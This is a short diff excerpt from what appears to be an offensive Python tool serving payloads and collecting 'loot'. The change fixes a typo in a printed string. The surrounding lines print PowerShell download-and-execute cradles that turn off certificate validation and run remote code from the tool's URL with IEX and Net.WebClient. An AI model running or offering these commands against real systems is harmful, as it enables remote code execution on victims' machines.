@@ -283,7 +283,7 @@ def main():
     print(f"URL:      {target_url}\n" 
           f"Password: {args.password}\n"
           f"Loot dir: {args.targetdir}\n")
-    print("Load into PowerShell via NetWebclient:\n"
+    print("Load into PowerShell via NetWebClient:\n"
           "PS > [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
           f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n\n"
           "Load into PowerShell via Invoke-WebRequest:\n"
